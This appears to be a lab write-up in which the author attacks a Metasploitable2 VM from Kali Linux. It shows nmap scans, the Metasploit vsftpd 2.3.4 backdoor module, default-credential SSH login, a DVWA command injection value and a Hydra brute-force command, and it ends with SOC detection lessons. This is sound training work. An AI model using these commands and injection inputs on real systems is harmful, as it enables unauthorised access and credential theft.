# Kali Linux & Metasploitable2: Penetration Testing Lab

This project simulates an internal network attack scenario using Kali Linux (attacker) and Metasploitable2 (target). It demonstrates core reconnaissance, exploitation, and post-exploitation techniques aligned with SOC Analyst learning objectives.

---

## 📋 Table of Contents

- [Lab Setup](#lab-setup)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
  - [Basic Nmap Scan](#basic-nmap-scan)
  - [Service Version Detection](#service-version-detection)
  - [Vulnerability Detection](#vulnerability-detection)
- [Phase 2: Exploitation](#phase-2-exploitation)
  - [FTP Exploit – vsftpd 2.3.4 Backdoor](#ftp-exploit--vsftpd-234-backdoor-cve-2011-2523)
  - [SSH Exploit](#ssh-exploit)
  - [HTTP Exploit – DVWA Command Injection](#http-exploit--dvwa-command-injection)
  - [HTTP Brute-Force Attack – DVWA Login](#http-brute-force-attack--dvwa-login)

---

## 🛠️ Lab Setup

| Component    | Details                  |
|--------------|--------------------------|
| Attacker     | Kali Linux (UTM VM)      |
| Target       | Metasploitable2 (UTM VM) |
| Network Mode | Shared NAT / Bridged     |
| Connectivity | Confirmed via ping       |

---

## Phase 1: Reconnaissance

### Target IP: `192.168.64.3`

---
### Scan Files
These are the original Nmap scan output files I used for analysis:

* [basic-scan.txt](./basic-scan.txt)
* [version-scan.txt](./version-scan.txt)
* [vuln-scan.txt](./vuln-scan.txt)

---

### Basic Nmap Scan

```bash
nmap -sS -T4 192.168.64.3 -oN basic-scan.txt
```
**Summary of Open Ports:**
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)
  
#### Service Version Detection
```bash
nmap -sS -sV -T4 192.168.64.3 -oN version-scan.txt
```
Summary:
- FTP: vsftpd 2.3.4
- SSH: OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- HTTP: Apache 2.2.8
  
#### Vulnerability Detection
```bash
nmap --script vuln -T4 192.168.64.3 -oN vuln-scan.txt
```
**Summary:** 
- Port 21 (FTP) - VULNERABLE to vsftpd 2.3.4 backdoor (CVE-2011-2523)
- Port 80 (HTTP) - Apache version outdated with multiple CVEs


---

## Phase 2: Exploitation

### FTP Exploit – vsftpd 2.3.4 Backdoor CVE-2011-2523

#### Tool Used: Metasploit Framework
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.64.3
exploit
```

**Result:** 
* Successful shell access as `root`
* Verified with `whoami`


---

### SSH Exploit

**Target IP:** 192.168.64.3  
**Tool Used:** Native OpenSSH Client
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3
```

**Result:** 
* Successful login using default credentials:
  * Username: `msfadmin`
  * Password: `msfadmin`
* Access confirmed with:
  `whoami`

---

#### Compatibility Issue: Legacy SSH Key Algorithms

**Problem Encountered**
```Unable to negotiate with 192.168.64.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss```

**Solution**
```ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3```

**Lessons Learned:**
Modern SSH clients disable depreciated algorithms by default. Lab environments often require these legacy options to connect. SOC teams should watch for deprecated algorithm negotiation in logs as potential indicators of legacy or malicious activity.


---

### HTTP Exploit – DVWA Command Injection

**Target URL:** `http://192.168.64.3/dvwa/vulnerabilities/exec/`
**Authentication:**  
- Username: `admin`  
- Password: `password`

**DVWA Configuration:**
- Set security level to `Low` under the "DVWA Security" tab

**Recon Tool Used:** [Nikto](https://github.com/sullo/nikto)  
**Scan Output:** [nikto-scan.txt](./nikto-scan.txt)

Nikto was used to identify accessible directories and common web vulnerabilities. This helped uncover `/phpinfo.php` and `/test/`, indicating potential weak points in the Apache web server.

**Exploit Method:**
- Injected shell command via the IP input field:
```bash
127.0.0.1; whoami
```

**Output:**
```PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
...
www-data
```

***Result:***
* Successfully executed `whoami`
* Confirmed remote command execution vulnerability


---

### HTTP Brute-Force Attack – DVWA Login

**Target URL:** `http://192.168.64.3/dvwa/login.php` 
**Login Type:** HTTP POST Form  
**Tool Used:** Hydra

**Command:**
```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.64.3 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**Result:**
```[80][http-post-form] host: 192.168.64.3   login: admin   password: password```

**Summary:** 
* Performed a dictionary brute-force attack
* Login credentials were discovered
* Demonstrated the importance of strong password credential policies


### SOC Analyst Takeaways

Brute-Force Detection

Brute-force attacks against web apps and SSH show up as a flood of failed login attempts in your logs — Hydra made this obvious during the DVWA exercise
Watch for repeated POST requests hitting login pages, especially in short time windows
This is exactly the kind of noise an IDS/IPS should be tuned to catch — pair that with rate limiting, account lockout, and MFA and you've significantly raised the cost of this attack

Patch Management Matters More Than People Think

vsftpd 2.3.4 has a backdoor that's been publicly documented since 2011 (CVE-2011-2523) — it still worked here without modification
If a 13-year-old exploit runs clean in your environment, that's a patch management problem, not a sophisticated attack
Regular vulnerability scans (Nessus, OpenVAS) exist specifically to catch this before an attacker does

Legacy Cryptography in Logs

When I tried to SSH into Metasploitable2, my modern client refused to connect because the server was offering deprecated algorithms (ssh-rsa, ssh-dss)
That negotiation attempt shows up in logs — and if you're seeing it from an external IP, it's worth a closer look
SOC teams should alert on legacy algorithm negotiation from unexpected sources and enforce modern cipher suites on any systems they control

Command Injection & Web App Security

The DVWA command injection exercise was a good reminder that unsanitized input fields can hand an attacker OS-level access — I went from a web form to running whoami as www-data in about 30 seconds
Input validation and WAF rules should be the first line of defense here, but also make sure your web server processes are running with least privilege so even a successful injection has limited blast radius
